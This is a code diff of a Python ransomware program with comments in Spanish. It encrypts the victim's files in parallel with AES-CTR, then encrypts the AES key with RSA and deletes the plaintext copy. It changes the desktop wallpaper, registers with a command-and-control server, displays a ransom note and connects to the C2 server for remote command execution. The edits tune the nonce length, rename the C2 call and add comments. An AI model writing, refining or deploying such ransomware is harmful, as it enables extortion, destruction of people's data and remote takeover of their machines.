@@ -3,7 +3,6 @@ import ctypes
 import multiprocessing
 from Crypto.Cipher import AES, PKCS1_OAEP
 from Crypto.PublicKey import RSA
-from Crypto.Util.Padding import pad
 from find_files import find_files
 import gen_keys
 import agent
@@ -25,7 +24,7 @@ def encrypt_aes_key(aes_key):
 
 def encrypt_file(file, aes_key):
     try:
-        nonce = os.urandom(8) 
+        nonce = os.urandom(12) 
         cipher = AES.new(aes_key, AES.MODE_CTR, nonce=nonce)
         with open(file, "rb") as f:
             data = f.read()
@@ -43,14 +42,14 @@ def encrypt_files():
     aes_key = load_aes_key()  # Cargar la clave simétrica
     files = find_files()  # Obtener lista de archivos a cifrar
     with multiprocessing.Pool(processes=os.cpu_count()) as pool:
-        pool.starmap(encrypt_file, [(file, aes_key) for file in files])
+        pool.starmap(encrypt_file, [(file, aes_key) for file in files]) # cifrado de archivos
     print("Archivos cifrados correctamente.")
     encrypt_aes_key(aes_key)  # Se cifra la clave AES con RSA
     os.remove("aes_key.bin")  # Eliminar clave simétrica sin cifrar
     change_background() # Cambiar fondo de pantalla
     agent.register_agent()  # Registrar agente en comando y control
-    ransom_note.show_ransom_note()
-    agent.connect_to_server()
+    ransom_note.show_ransom_note() # Mostrar nota de rescate personalizada en escritorio
+    agent.connect_to_c2_server() # Conexión con servidor C2 para ejecución remota de comandos
 
 def change_background():
     image_path = os.path.abspath("background_image/background.png")
